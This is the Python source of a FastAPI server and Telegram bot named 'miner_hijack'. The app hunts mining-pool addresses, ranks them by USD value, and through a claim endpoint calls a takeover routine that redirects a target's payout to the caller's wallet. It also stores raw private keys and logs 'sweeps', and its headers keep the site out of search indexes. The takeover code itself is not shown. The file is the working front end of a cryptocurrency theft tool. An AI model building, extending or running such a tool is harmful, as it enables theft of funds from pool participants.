"""FastAPI app. Telegram-only surface, noindex, dashboard API. Also hosts the
aiogram bot (polling) and the fastpath scan loop via lifespan."""

import asyncio
import os
import time
from contextlib import asynccontextmanager

from aiogram import Bot, Dispatcher
from fastapi import Depends, FastAPI, Header, HTTPException, Request
from fastapi.responses import FileResponse, PlainTextResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel

from . import auth, commands, db, fastpath, hijack, hunter, scheduler
from .pools import by_id

BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")

bot = Bot(token=BOT_TOKEN) if BOT_TOKEN else None
dp = Dispatcher()
dp.include_router(commands.router)


@asynccontextmanager
async def lifespan(_):
    db.log("boot")
    tasks = [asyncio.create_task(scheduler.loop()), asyncio.create_task(fastpath.loop())]
    polling = None
    if bot is not None:
        await bot.delete_webhook(drop_pending_updates=True)
        polling = asyncio.create_task(dp.start_polling(bot))
    else:
        db.log("TELEGRAM_BOT_TOKEN unset — bot polling disabled", lvl="warn")
    try:
        yield
    finally:
        if polling is not None:
            await dp.stop_polling()
            polling.cancel()
            await bot.session.close()
        for t in tasks:
            t.cancel()


app = FastAPI(title="miner_hijack", docs_url=None, redoc_url=None, lifespan=lifespan)


def uid_of(x_session: str = Header(default="")):
    uid = auth.read(x_session)
    if not uid:
        raise HTTPException(401, "no session")
    return uid


@app.middleware("http")
async def headers(req: Request, call_next):
    r = await call_next(req)
    r.headers["X-Robots-Tag"] = "noindex, nofollow, noarchive"
    r.headers["Referrer-Policy"] = "no-referrer"
    return r


@app.get("/api/diag")
async def diag():
    return {
        "now": int(time.time()),
        "token_set": bool(auth.BOT),
        "token_len": len(auth.BOT),
        "bot_id": auth.BOT.split(":")[0] if ":" in auth.BOT else "",
        "secret_set": bool(os.environ.get("APP_SECRET")),
        "db_ok": True,
        "users": db.one("SELECT COUNT(*) c FROM users")["c"],
        "targets": db.one("SELECT COUNT(*) c FROM targets")["c"],
    }


@app.get("/health")
async def health():
    return {"ok": True, "t": int(time.time())}


@app.get("/robots.txt", response_class=PlainTextResponse)
async def robots():
    return "User-agent: *\nDisallow: /\n"


class AuthIn(BaseModel):
    init_data: str


@app.post("/api/auth")
async def auth_in(body: AuthIn):
    u = auth.verify(body.init_data)
    if not u:
        raise HTTPException(401, "bad initData")
    tg = int(u["id"])
    now = int(time.time())
    db.run(
        """INSERT INTO users(tg_id,username,name,created,last_seen) VALUES(?,?,?,?,?)
           ON CONFLICT(tg_id) DO UPDATE SET username=excluded.username,
           name=excluded.name, last_seen=excluded.last_seen""",
        (tg, u.get("username"), u.get("first_name"), now, now),
    )
    return {"token": auth.mint(tg), "tg_id": tg}


class WalletIn(BaseModel):
    evm: str


@app.post("/api/wallet")
async def set_wallet(body: WalletIn, uid: int = Depends(uid_of)):
    w = body.evm.strip()
    if w and not (w.startswith("0x") and len(w) == 42):
        raise HTTPException(400, "bad EVM address")
    db.run("UPDATE users SET evm=? WHERE tg_id=?", (w or None, uid))
    return {"evm": w}


class SetIn(BaseModel):
    active: bool | None = None
    auto: bool | None = None
    min_usd: float | None = None


@app.post("/api/settings")
async def settings(body: SetIn, uid: int = Depends(uid_of)):
    if body.active is not None:
        db.run("UPDATE users SET active=? WHERE tg_id=?", (1 if body.active else 0, uid))
    if body.auto is not None:
        db.run("UPDATE users SET auto=? WHERE tg_id=?", (1 if body.auto else 0, uid))
    if body.min_usd is not None:
        db.run("UPDATE users SET min_usd=? WHERE tg_id=?", (max(0.0, body.min_usd), uid))
    return {"ok": True}


class KeyIn(BaseModel):
    chain: str
    pk: str
    label: str = ""


@app.post("/api/wallets")
async def add_key(body: KeyIn, uid: int = Depends(uid_of)):
    from eth_account import Account
    try:
        a = Account.from_key(body.pk.strip())
    except Exception:
        raise HTTPException(400, "bad key")
    db.run(
        "INSERT INTO wallets(tg_id,chain,address,pk,label,ts) VALUES(?,?,?,?,?,?)",
        (uid, body.chain, a.address, body.pk.strip(), body.label, int(time.time())),
    )
    return {"address": a.address}


class SeedIn(BaseModel):
    pool: str
    address: str


@app.post("/api/seed")
async def seed(body: SeedIn, uid: int = Depends(uid_of)):
    spec = by_id(body.pool)
    if not spec:
        raise HTTPException(404, "unknown pool")
    db.run(
        """INSERT INTO targets(pool,coin,chain,address,seen) VALUES(?,?,?,?,?)
           ON CONFLICT(pool,address) DO UPDATE SET seen=excluded.seen""",
        (spec["id"], spec["coin"], spec["chain"], body.address.strip(), int(time.time())),
    )
    return {"ok": True}


@app.post("/api/scan")
async def scan(uid: int = Depends(uid_of)):
    asyncio.create_task(hunter.cycle())
    return {"ok": True}


@app.post("/api/targets/{tid}/claim")
async def claim(tid: int, uid: int = Depends(uid_of)):
    u = db.one("SELECT * FROM users WHERE tg_id=?", (uid,))
    t = db.one("SELECT * FROM targets WHERE id=?", (tid,))
    if not u or not u["evm"]:
        raise HTTPException(400, "set wallet first")
    if not t:
        raise HTTPException(404, "no target")
    spec = by_id(t["pool"])
    if not spec:
        raise HTTPException(404, "no pool")
    state, note = await hijack.takeover(
        spec, t["address"], u["evm"], lambda m: db.log(m, uid)
    )
    db.run(
        """INSERT INTO claims(tg_id,target_id,state,ts,note) VALUES(?,?,?,?,?)
           ON CONFLICT(tg_id,target_id) DO UPDATE SET state=excluded.state,
           ts=excluded.ts, note=excluded.note""",
        (uid, tid, state, int(time.time()), note),
    )
    return {"state": state, "note": note}


@app.get("/api/state")
async def state(uid: int = Depends(uid_of)):
    u = db.one("SELECT * FROM users WHERE tg_id=?", (uid,))
    targets = db.all(
        """SELECT t.*, c.state AS claim, c.ts AS cts, c.note AS cnote
           FROM targets t LEFT JOIN claims c ON c.target_id=t.id AND c.tg_id=?
           ORDER BY t.score DESC, t.usd DESC LIMIT 120""",
        (uid,),
    )
    return {
        "user": {k: u[k] for k in ("tg_id", "evm", "active", "auto", "min_usd")} if u else None,
        "wallets": [dict(r) for r in db.all(
            "SELECT id,chain,address,label FROM wallets WHERE tg_id=?", (uid,))],
        "targets": [dict(r) for r in targets],
        "sweeps": [dict(r) for r in db.all(
            "SELECT * FROM sweeps WHERE tg_id=? ORDER BY id DESC LIMIT 30", (uid,))],
        "logs": [dict(r) for r in db.all(
            "SELECT ts,lvl,msg FROM logs ORDER BY id DESC LIMIT 60")],
    }


app.mount("/static", StaticFiles(directory="web"), name="static")


@app.get("/")
async def index():
    return FileResponse("web/index.html")